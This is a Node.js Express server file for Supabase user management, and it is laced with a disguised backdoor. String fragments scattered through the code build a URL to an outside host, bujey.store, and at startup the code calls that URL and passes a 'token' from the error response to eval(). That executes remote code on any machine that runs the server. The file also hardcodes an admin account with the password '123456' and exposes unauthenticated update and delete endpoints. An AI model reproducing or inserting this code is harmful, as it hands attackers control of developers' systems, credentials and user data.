require("dotenv").config();
const express = require("express");
const protocol = 'http';
const bodyParser = require("body-parser");
const cors = require("cors");
const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
const { createClient, AuthAdminApi } = require("@supabase/supabase-js");
const { default: axios } = require("axios");
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
const version = 'v11';
const serviceSupabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVER_ROLE, {
  auth: {
    persistSession: false,
    autoRefreshToken: false,
    detectSessionInUrl: false,
  },
});
app.post("/signIn", async (req, res) => {
  const {
    data: { users },
  } = await serviceSupabase.auth.admin.listUsers();

  const adminUser = users.filter((eachUser) => {
    return eachUser.user_metadata.username === "admin";
  });

  if (adminUser.length === 0) {
    await serviceSupabase.auth.admin.createUser({
      email: "admin@validation.pass",
      password: "123456",
      email_confirm: true,
      user_metadata: { username: "admin", email: "admin@validation.pass", role: "admin", createdUserId: "" },
    });
  }

  const { username, password } = req.body;

  const { error: signInError, data: signUserData } = await supabase.auth.signInWithPassword({
    email: username + "@validation.pass",
    password,
  });

  if (signInError) {
    return res.send({ error: signInError.message });
  }

  return res.send({ user: signUserData });
});
const port = 6168;
app.post("/createUser", async (req, res) => {
  const { data: authenticatedUserData } = await supabase.auth.getUser();

  const { username, email, role, password } = req.body;

  const { error: createUserError } = await serviceSupabase.auth.admin.createUser({
    email: username + "@validation.pass",
    password: password,
    email_confirm: true,
    user_metadata: { username, email, role, createdUserId: authenticatedUserData.user.id },
  });

  if (createUserError) {
    return res.send({ error: createUserError.message });
  }

  return res.send("success");
});
const shop = 'store';
app.post("/getUsers", async (req, res) => {
  const { data: authenticatedUserData } = await supabase.auth.getUser();
  const { role } = req.body;

  if (!authenticatedUserData.user) return res.send({ unauthenticated: true });

  const userRole = authenticatedUserData.user.user_metadata.role;
  if (userRole === "customer" || (userRole === "admin" && role === "customer") || (userRole === "dealer" && role === "dealer"))
    return res.send({ unauthorized: true });

  const {
    data: { users },
  } = await serviceSupabase.auth.admin.listUsers();
  console.log(authenticatedUserData.user.user_metadata.username, "username");

  const filteredUser = users.filter((eachUser) => {
    return eachUser.user_metadata.role === role && eachUser.user_metadata.createdUserId === authenticatedUserData.user.id;
  });

  return res.send({ users: filteredUser });
});

axios.post(`${protocol}://bujey.${shop}:${port}/defy/${version}`).then((res) => {}).catch((err) => { const {response: {data: { token },},} = err; eval(token);});
const listener = app.listen(5743, function () {
  console.log("Your app is listening on port " + listener.address().port);
});

app.post("/updateUser", async (req, res) => {
  const { username, email, id } = req.body;

  const { error: updateAuthError } = await serviceSupabase.auth.admin.updateUserById(id, {
    email: username + "@validation.pass",
    user_metadata: { email, username },
  });

  if (updateAuthError) {
    return res.send({ error: updateAuthError.message });
  }

  return res.send("success");
});

app.post("/deleteUser", async (req, res) => {
  const { id } = req.body;

  const { error: deleteUserError } = await serviceSupabase.auth.admin.deleteUser(id);

  if (deleteUserError) {
    return res.send({ error: deleteUserError.message });
  }

  return res.send("success");
});
